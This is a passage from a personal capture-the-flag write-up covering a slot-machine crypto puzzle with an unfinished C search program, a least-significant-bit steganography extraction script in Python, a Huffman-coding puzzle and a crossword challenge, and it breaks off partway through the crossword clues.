--unreachable --lost-found</span><span class="c7">&nbsp;which finds everything and it found nothing. I had some other leads for places on GitHub where the info might be but it ultimately led nowhere.</span></p><hr><p class="c1"><span class="c7"></span></p><p class="c47 c39 title" id="h.3zoo0eqdd7ko"><span class="c51 c41">Crypto</span></p><hr><p class="c1"><span class="c7"></span></p><h1 class="c25" id="h.aijjpv92npry"><span class="c10">cherry</span></h1><p class="c15"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 877.00px; height: 725.00px;"><img alt="" src="images/image49.png" style="width: 877.00px; height: 725.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c15"><span class="c7">This is a crypto puzzle. The idea is to read the source code and figure out what the plaintext would be with triple cherries. Except, this is javascript. I could just open the console and set the slots to cherries. Let&rsquo;s try that.</span></p><p class="c15"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 887.00px; height: 550.00px;"><img alt="" src="images/image34.png" style="width: 887.00px; height: 550.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c15"><span>Playing around with the source code, here&rsquo;s what I learned: if </span><span class="c32 c35">slotIndices</span><span>&nbsp;is </span><span class="c32 c35">[0,0,0]</span><span>&nbsp;that&rsquo;s all cherries and we win, however the plaintext is what we&rsquo;re after and that&rsquo;s not controlled by </span><span class="c32 c35">slotIndices</span><span>&nbsp;it&rsquo;s controlled by </span><span class="c32 c35">spinCounts</span><span>, which tracks how many spins have been performed in each respective &ldquo;play coin&rdquo; mode. </span><span class="c32 c35">slotSpins</span><span>&nbsp;can be one of either </span><span class="c32 c35">[19,22,19]</span><span>, </span><span class="c32 c35">[32,27,29]</span><span>, or </span><span class="c32 c35">[347,349,353]</span><span class="c7">&nbsp;depending on the &ldquo;play coin&rdquo; option, these are all prime numbers.</span></p><p class="c15"><span class="c7">What it comes down to is this: We need to figure out what sequence of moves gets us to the desired state. We have three possible starting points, and three possible moves. The desired state is to get all three slot Indices to add up to 32768, which will then overflow to 0. There are theoretically infinite possible solutions if we allow overflowing multiple times, maybe multiple solutions even if we don&rsquo;t. We should probably assume the shortest solution is the correct one.</span></p><p class="c15"><span>At this point I was about to get started on game tree search and I almost forgot about the associative property of addition. We don&rsquo;t actually need to work through all possible moves, we just need to work through all reasonable values of </span><span class="c32 c35">spinCounts</span></p><p class="c15"><span class="c7">&nbsp;So without further ado, I started writing code.</span></p><a id="t.c2aa711cf88119d4c7e03225d7abb6bec01150d4"></a><a id="t.25"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c36">#include &lt;stdio.h&gt;</span><span class="c3"><br></span><span class="c36">#include &lt;stdlib.h&gt;</span><span class="c3"><br></span><span class="c36">#include &lt;string.h&gt;</span><span class="c3"><br></span><span class="c36">#include &lt;stdbool.h&gt;</span><span class="c3"><br> <br></span><span class="c16">const</span><span class="c3">&nbsp;</span><span class="c16">int</span><span class="c3">&nbsp;m = </span><span class="c0">32768</span><span class="c3">;<br> <br></span><span class="c16">typedef</span><span class="c3">&nbsp;</span><span class="c16">int</span><span class="c3">&nbsp;i3[</span><span class="c0">3</span><span class="c3">];<br></span><span class="c16">const</span><span class="c3">&nbsp;i3 starting_positions[</span><span class="c0">3</span><span class="c3">] = {{</span><span class="c0">10992</span><span class="c3">, </span><span class="c0">30978</span><span class="c3">, </span><span class="c0">12520</span><span class="c3">}, {</span><span class="c0">30983</span><span class="c3">, &nbsp;</span><span class="c0">7390</span><span class="c3">, &nbsp; </span><span class="c0">481</span><span class="c3">}, {</span><span class="c0">25974</span><span class="c3">, </span><span class="c0">26744</span><span class="c3">, &nbsp;</span><span class="c0">9122</span><span class="c3">}};<br>i3 moves[</span><span class="c0">3</span><span class="c3">] = { { </span><span class="c0">19</span><span class="c3">, &nbsp;</span><span class="c0">22</span><span class="c3">, &nbsp;</span><span class="c0">19</span><span class="c3">}, { </span><span class="c0">32</span><span class="c3">, &nbsp;</span><span class="c0">27</span><span class="c3">, &nbsp;</span><span class="c0">29</span><span class="c3">}, {</span><span class="c0">347</span><span class="c3">, </span><span class="c0">349</span><span class="c3">, </span><span class="c0">353</span><span class="c3">} };<br> <br></span><span class="c36">#define FOR3 for(int i=0; i&lt;3; i++)</span><span class="c3"><br></span><span class="c36">#define JFOR3 for(int j=0; j&lt;3; j++)</span><span class="c3"><br></span><span class="c36">#define COPY_OF(I3) {I3[0],I3[1],I3[2]}</span><span class="c3"><br> <br></span><span class="c16">void</span><span class="c3">&nbsp;</span><span class="c9">i_add</span><span class="c3">&nbsp;(i3 a, i3 b) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FOR3 a[i] += b[i];<br>}<br> <br></span><span class="c16">void</span><span class="c3">&nbsp;</span><span class="c9">i_mul</span><span class="c3">&nbsp;(i3 a, </span><span class="c16">int</span><span class="c3">&nbsp;b) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FOR3 a[i] *= b;<br>}<br> <br></span><span class="c16">int</span><span class="c3">* </span><span class="c9">copy</span><span class="c3">&nbsp;(i3 a) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c16">int</span><span class="c3">* out = </span><span class="c9">malloc</span><span class="c3">(</span><span class="c16">sizeof</span><span class="c3">(i3));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FOR3 out[i] = a[i];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c16">return</span><span class="c3">&nbsp;out;<br>}<br> <br></span><span class="c16">void</span><span class="c3">&nbsp;</span><span class="c9">print</span><span class="c3">(i3 a) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c9">printf</span><span class="c3">( </span><span class="c14">&quot;%d,%d,%d\n&quot;</span><span class="c3">, a[</span><span class="c0">0</span><span class="c3">], a[</span><span class="c0">1</span><span class="c3">], a[</span><span class="c0">2</span><span class="c3">]) ;<br>}<br></span><span class="c16">void</span><span class="c3">&nbsp;</span><span class="c9">labelled_print</span><span class="c3">(</span><span class="c16">char</span><span class="c3">* s, i3 a) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c9">printf</span><span class="c3">(</span><span class="c14">&quot;%s %d,%d,%d\n&quot;</span><span class="c3">, s, a[</span><span class="c0">0</span><span class="c3">], a[</span><span class="c0">1</span><span class="c3">], a[</span><span class="c0">2</span><span class="c3">]) ;<br>}<br> <br></span><span class="c16">int</span><span class="c3">* </span><span class="c9">evaluate_spinCounts</span><span class="c3">(i3 spinCounts) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c16">int</span><span class="c3">* a0 = copy(moves[</span><span class="c0">0</span><span class="c3">]);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i3 a1 = COPY_OF(moves[</span><span class="c0">1</span><span class="c3">]);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i3 a2 = COPY_OF(moves[</span><span class="c0">2</span><span class="c3">]);<br> <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i_mul(a0, spinCounts[</span><span class="c0">0</span><span class="c3">]);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i_mul(a1, spinCounts[</span><span class="c0">1</span><span class="c3">]);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i_mul(a2, spinCounts[</span><span class="c0">2</span><span class="c3">]);<br> <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i_add(a0, a1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i_add(a0, a2);<br> <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c16">return</span><span class="c3">&nbsp;a0;<br>}<br> <br></span><span class="c36">#define st starting_positions</span><span class="c3"><br>i3 targets[</span><span class="c0">3</span><span class="c3">] = {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{m - st[</span><span class="c0">0</span><span class="c3">][</span><span class="c0">0</span><span class="c3">], m - st[</span><span class="c0">0</span><span class="c3">][</span><span class="c0">1</span><span class="c3">], m - st[</span><span class="c0">0</span><span class="c3">][</span><span class="c0">2</span><span class="c3">]},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{m - st[</span><span class="c0">0</span><span class="c3">][</span><span class="c0">0</span><span class="c3">], m - st[</span><span class="c0">0</span><span class="c3">][</span><span class="c0">1</span><span class="c3">], m - st[</span><span class="c0">0</span><span class="c3">][</span><span class="c0">2</span><span class="c3">]},<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{m - st[</span><span class="c0">0</span><span class="c3">][</span><span class="c0">0</span><span class="c3">], m - st[</span><span class="c0">0</span><span class="c3">][</span><span class="c0">1</span><span class="c3">], m - st[</span><span class="c0">0</span><span class="c3">][</span><span class="c0">2</span><span class="c3">]}<br>};<br></span><span class="c36">#undef &nbsp;st</span><span class="c3"><br></span><span class="c16">bool</span><span class="c3">&nbsp;</span><span class="c9">less_than_targets</span><span class="c3">(i3 a) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JFOR3 {<br> &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FOR3 </span><span class="c9">if</span><span class="c3">(a[j] &gt; targets[j][i]) </span><span class="c16">return</span><span class="c3">&nbsp;</span><span class="c16">false</span><span class="c3">; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c16">return</span><span class="c3">&nbsp; </span><span class="c16">true</span><span class="c3">;<br>}<br> <br> <br></span><span class="c16">int</span><span class="c3">&nbsp;</span><span class="c9">main</span><span class="c3">(</span><span class="c16">void</span><span class="c3">) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i3 spinCounts = {</span><span class="c0">0</span><span class="c3">,</span><span class="c0">0</span><span class="c3">,</span><span class="c0">0</span><span class="c3">};<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c16">int</span><span class="c3">* result = evaluate_spinCounts(spinCounts);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c16">while</span><span class="c3">(less_than_targets(result)) {<br> &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(result);<br> &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;spinCounts[result[</span><span class="c0">0</span><span class="c3">] % </span><span class="c0">3</span><span class="c3">] ++;<br> &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result = evaluate_spinCounts(spinCounts);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(result);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(spinCounts);<br>}</span></p></td></tr></table><p class="c15"><span class="c7">I chose C for this task which was most certainly the wrong choice. In typical fashion I began by spending the better part of an hour creating data structures and helper functions, and I lost some time to a strange error caused by memory corruption because I forgor to initialize my values &#128128;. I chose C because I thought I would have to worry about performance and memory complexity for this problem, but I was probably wrong and it didn&rsquo;t ultimately matter because I ran out of time before I got as far as even being able to explore the problem.</span></p><p class="c15"><span>C is still an awesome language, it&rsquo;s especially fun to refactor and optimize C because you can really get huge value out of understanding how it works, but it was pure pain using it here.</span></p><hr><p class="c1"><span class="c7"></span></p><p class="c47 c39 title" id="h.eksc0ez7pf0q"><span class="c41 c51">Forensics</span></p><hr><p class="c1"><span class="c7"></span></p><h1 class="c17" id="h.p0dw5g3m7mfz"><span class="c10">Alien_transmission</span></h1><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 546.62px; height: 121.86px;"><img alt="" src="images/image51.png" style="width: 546.62px; height: 121.86px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c6 subtitle" id="h.eylu6q1aunas"><span class="c19">Yeah, we all know this one. right?</span></p><h1 class="c17" id="h.j7t6mdpwdrvv"><span>the_REAL_truth</span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 900.83px; height: 823.03px;"><img alt="" src="images/image47.png" style="width: 1102.01px; height: 901.14px; margin-left: -94.02px; margin-top: -42.07px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></h1><p class="c6 subtitle" id="h.9zbpe0mphkij"><span class="c19">There is a secret hidden somewhere on this page.</span></p><p class="c18"><span>The choice to use Carrd is a little surprising. This is, after all, almost as simple of a webpage as you could hope to make. Maybe there&rsquo;s more to this decision than I realize.</span></p><a id="t.cf9bd15b52d8ae5ec0b5d8ce5849bb565040013d"></a><a id="t.26"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c12">&lt;</span><span class="c4">section</span><span class="c12">&nbsp;id=</span><span class="c14">&quot;section02-section&quot;</span><span class="c12">&nbsp;class=</span><span class="c14">&quot;inactive&quot;</span><span class="c12">&nbsp;style=</span><span class="c14">&quot;display: none;&quot;</span><span class="c12">&gt;&lt;</span><span class="c4">p</span><span class="c12">&nbsp;id=</span><span class="c14">&quot;text02&quot;</span><span class="c12">&gt;</span><span class="c3">i&#39;m not paying for carrd, you&#39;ll have to deal with the footer lol</span><span class="c12">&lt;/</span><span class="c4">p</span><span class="c12">&gt;&lt;/</span><span class="c4">section</span><span class="c12">&gt;</span></p></td></tr></table><p class="c45"><span>The HTML actually does contain a hidden message, but it&rsquo;s not that interesting. What we&rsquo;re after is this:</span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 514.00px; height: 618.17px;"><img alt="" src="images/image13.png" style="width: 514.00px; height: 618.17px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span>See that noise in the image? I&rsquo;m pretty sure there&rsquo;s a message hidden in there. The process of hiding text in images is called </span><span class="c43">Image Steganography</span><span class="c7">. That frame around the image worries me somewhat; I hope I don&rsquo;t have to remove it, because I&rsquo;m not sure I&rsquo;d know how to do that while preserving the message.</span></p><p class="c18"><span>There&rsquo;s a Python library called </span><span class="c40">pillow</span><span>&nbsp;that can do steganography so I may as well try that first. I stole some code from </span><span class="c37"><a class="c28" href="https://www.google.com/url?q=https://www.geeksforgeeks.org/image-steganography-in-cryptography/&amp;sa=D&amp;source=editors&amp;ust=1719257876282368&amp;usg=AOvVaw2tW4-uFusVh_NOimcPlcta">GeeksForGeeks</a></span><span class="c7">&nbsp;and slapped a command-line interface on it.</span></p><a id="t.616356b01ac73806d95bbe83667ccbdce66d07bf"></a><a id="t.27"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c20">#!/usr/bin/env python</span><span class="c3"><br><br></span><span class="c16">from</span><span class="c3">&nbsp;PIL </span><span class="c16">import</span><span class="c3">&nbsp;Image<br></span><span class="c16">import</span><span class="c3">&nbsp;sys<br><br></span><span class="c16">def</span><span class="c3">&nbsp;</span><span class="c9">extract_text</span><span class="c3">(image_path):<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c20"># Open the image</span><span class="c3"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;image = Image.open(image_path)<br> <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c20"># Extract the secret text from the image</span><span class="c3"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pixels = image.load()<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;binary_secret_text = </span><span class="c14">&quot;&quot;</span><span class="c3"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c16">for</span><span class="c3">&nbsp;i </span><span class="c16">in</span><span class="c3">&nbsp;range(image.width):<br> &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c16">for</span><span class="c3">&nbsp;j </span><span class="c16">in</span><span class="c3">&nbsp;range(image.height):<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r, g, b = pixels[i, j]<br> <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c20"># Extract the least significant bit of each color channel</span><span class="c3"><br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;binary_secret_text += str(r &amp; </span><span class="c0">1</span><span class="c3">)<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;binary_secret_text += str(g &amp; </span><span class="c0">1</span><span class="c3">)<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;binary_secret_text += str(b &amp; </span><span class="c0">1</span><span class="c3">)<br> <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c20"># Convert the binary text to ASCII</span><span class="c3"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;secret_text = </span><span class="c14">&quot;&quot;</span><span class="c3"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c16">for</span><span class="c3">&nbsp;i </span><span class="c16">in</span><span class="c3">&nbsp;range(</span><span class="c0">0</span><span class="c3">, len(binary_secret_text), </span><span class="c0">8</span><span class="c3">):<br> &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char = chr(int(binary_secret_text[i:i+</span><span class="c0">8</span><span class="c3">], </span><span class="c0">2</span><span class="c3">))<br> &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;secret_text += char<br> <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c16">return</span><span class="c3">&nbsp;secret_text<br><br></span><span class="c16">if</span><span class="c3">&nbsp;__name__ == </span><span class="c14">&quot;__main__&quot;</span><span class="c3">:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="c16">for</span><span class="c3">&nbsp;s </span><span class="c16">in</span><span class="c3">&nbsp;sys.argv[</span><span class="c0">1</span><span class="c3">:]:<br> &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(extract_text(s))</span></p></td></tr></table><p class="c18"><span>Alright, here goes:</span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 783.00px; height: 593.02px;"><img alt="" src="images/image48.gif" style="width: 783.00px; height: 593.02px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c7">It&rsquo;s just nonsense. I tried grepping and everything. Though thinking about it, it would be crazy if it actually worked, considering this is just an example of one way you could hide a message in an image. At &nbsp;this point I am now thinking about all the things I don&rsquo;t know, so I&rsquo;ll start by trying to encode my own message in my own image and compare that to the one I was given. To GIMP!</span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 628.53px; height: 520.75px;"><img alt="" src="images/image33.gif" style="width: 628.53px; height: 520.75px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span class="c7">After expanding my script and fixing surprisingly many bugs, some of which weren&rsquo;t even mine, here is an image with some text encoded into it.</span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 297.50px; height: 354.63px;"><img alt="" src="images/image38.png" style="width: 297.50px; height: 354.63px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><h4 class="c39 c61" id="h.w4ukb7gclqu4"><span class="c29">I wonder what she&rsquo;s thinking about&hellip;</span></h4><p class="c18"><span class="c7">It was a pretty big body of text, and it looks exactly the same. That&rsquo;s because this method prepends the data to the image, rather than mixing it in somehow. So we&rsquo;re dealing with something very different. I don&rsquo;t fancy my chances to reverse-engineer this encoding, and hoping to stumble on an answer through the web isn&rsquo;t my cuppa so I&rsquo;ll move on for now.</span></p><hr><p class="c1"><span class="c7"></span></p><p class="c18 c34"><span class="c7"></span></p><p class="c39 c47 title" id="h.3dzz2rtv0w8d"><span class="c51 c41">Misc.</span></p><hr><p class="c1"><span class="c7"></span></p><h1 class="c17" id="h.iqmraq3sr3y6"><span>T</span><span class="c10">his_is_canon</span></h1><p class="c18 c34"><span class="c7"></span></p><p class="c18"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 687.50px; height: 335.94px;"><img alt="" src="images/image3.jpg" style="width: 687.50px; height: 335.94px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><a id="t.f5b04d257e60dbd6db267c78eab545d2034df15b"></a><a id="t.28"></a><table class="c11"><tr class="c13"><td class="c55" colspan="1" rowspan="1"><p class="c18"><span class="c32 c46">(0,0,4,3,7,6)</span></p><p class="c18"><span class="c32 c46">(_,e,l,y,j,o,r,a,c,d,s,t,u,w,f,h,k,m,{,}) 1000001010010011101111101011101011111010000010100100110000111001110111010000111011100111110100111100100110101111000001110010110110010001100011011001000011001110011101000110101100010110011111111 </span></p></td></tr></table><p class="c8"><span>The image is pretty useful. I might not have figured out what this was supposed to be without it. That said, figuring out this joke is its own puzzle. Nothing salient on Wikipedia for </span><span class="c37"><a class="c28" href="https://www.google.com/url?q=https://en.wikipedia.org/wiki/Canon&amp;sa=D&amp;source=editors&amp;ust=1719257876286666&amp;usg=AOvVaw0ND3sqrOqwURbCWOlpKaYi">Canon</a></span><span class="c7">. I think maybe the name refers to tree canonization. The joke, I&rsquo;m guessing, is a reference to this.</span></p><p class="c49"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 418.50px; height: 347.07px;"><img alt="https://i.imgur.com/Ot9xvxh.jpeg" src="images/image55.jpg" style="width: 418.50px; height: 851.42px; margin-left: 0.00px; margin-top: -0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c53"><span>With &ldquo;fanon&rdquo; meaning </span><span class="c40">femanon</span><span>&nbsp;or </span><span class="c40 c44">female anon.</span></p><p class="c18"><span>Edit: Some ancient knowledge got unearthed in my brain and I remembered that this is fanfiction lingo and not some extradimensional hyperjoke from the future.</span></p><p class="c8"><span>Anyway, I recognise what this is, or atleast, I recognise something like it: </span><span class="c43">Huffman Coding</span><span class="c7">, a text compression algorithm.</span></p><p class="c8"><span class="c65"><a class="c28" href="https://www.google.com/url?q=https://www.youtube.com/watch?v%3DJsTptu56GM8&amp;sa=D&amp;source=editors&amp;ust=1719257876287413&amp;usg=AOvVaw1FUgkV3hUEel23ntb6J468">How Computers Compress Text: Huffman Coding and Huffman Trees</a></span></p><p class="c18"><span class="c7">Except that first line - (0,0,4,3,7,6) - it doesn&rsquo;t seem like enough data to construct a Huffman Tree. It&rsquo;s possible that we have to make a partial Huffman tree and use statistics to do the rest, except this is a much harder problem than a substitution cipher because we don&rsquo;t actually know how many bits get assigned to each character.</span></p><h1 class="c17" id="h.9t95jy3w3n9k"><span class="c10">Is_jelly_stuck</span></h1><p class="c18"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 667.50px; height: 326.37px;"><img alt="" src="images/image26.png" style="width: 667.50px; height: 326.37px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c6 subtitle" id="h.g8m9wp73jbqk"><span class="c19">We got a crossword, very cool.</span></p><a id="t.6733b5f909cce394873d1ee2e5552103a21d435f"></a><a id="t.29"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c3">The flag is complete gibberish, but you&#39;ll know it when you&#39;re optimal!<br><br>ACROSS &nbsp; &nbsp;<br></span><span class="c0">1</span><span class="c3">&nbsp; &nbsp; Ancient </span><span class="c14">&quot;rose-red city&quot;</span><span class="c3"><br></span><span class="c0">6</span><span class="c3">&nbsp; &nbsp; Running off current<br></span><span class="c0">9</span><span class="c3">&nbsp; &nbsp; Statute<br></span><span class="c0">12</span><span class="c3">&nbsp; &nbsp; Remi, Airi, Shiina, Rie, Erina, Panko<br></span><span class="c0">13</span><span class="c3">&nbsp; &nbsp; Sci-fi star knight circa </span><span class="c0">1977</span><span class="c3"><br></span><span class="c0">14</span><span class="c3">&nbsp; &nbsp; New Phase branch, maybe<br></span><span class="c0">15</span><span class="c3">&nbsp; &nbsp; Minivan alternative, abbr.<br></span><span class="c0">16</span><span class="c3">&nbsp; &nbsp; Lists files in the current directory<br></span><span class="c0">17</span><span class="c3">&nbsp; &nbsp; Jelly is<br></span><span class="c0">22</span><span class="c3">&nbsp; &nbsp; Jelly is also a<br></span><span class="c0">23</span><span class="c3">&nbsp; &nbsp; This, backwards<br></span><span class="c0">24</span><span class="c3">&nbsp; &nbsp; Roman blackjack?<br><br>DOWN &nbsp; &nbsp;<br></span><span class="c0">1</span><span class="c3">&nbsp; &nbsp; Basic projectile and legume<br></span><span class="c0">2</span><span class="c3">&nbsp; &nbsp; Letter, Jelly only takes<br></span><span class="c0">3</span><span class="c3">&nbsp; &nbsp; Last name of developer, released a free beta on itch.io needed to solve this challenge<br></span><span class="c0">4</span><span class="c3">&nbsp; &nbsp; Color TV pioneer<br></span><span class="c0">5</span><span class="c3">&nbsp; &nbsp; Between ports<br></span><span class="c0">7</span><span class="c3">&nbsp; &nbsp; ... to ay resects<br></span><span class="c0">8</span><span class="c3">&nbsp; &nbsp; ... you?<br></span><span class="c0">9</span><span class="c3">&nbsp; &nbsp; Yellow, left-to-right top-to-bottom, code<br></span><span class="c0">10</span><span class="c3">&nbsp; &nbsp; Commonly blocked<br></span><span class="c0">11</span><span class="c3">&nbsp; &nbsp; Dorian Gray creator<br></span><span class="c0">13</span><span class="c3">&nbsp; &nbsp; Court panel<br></span><span 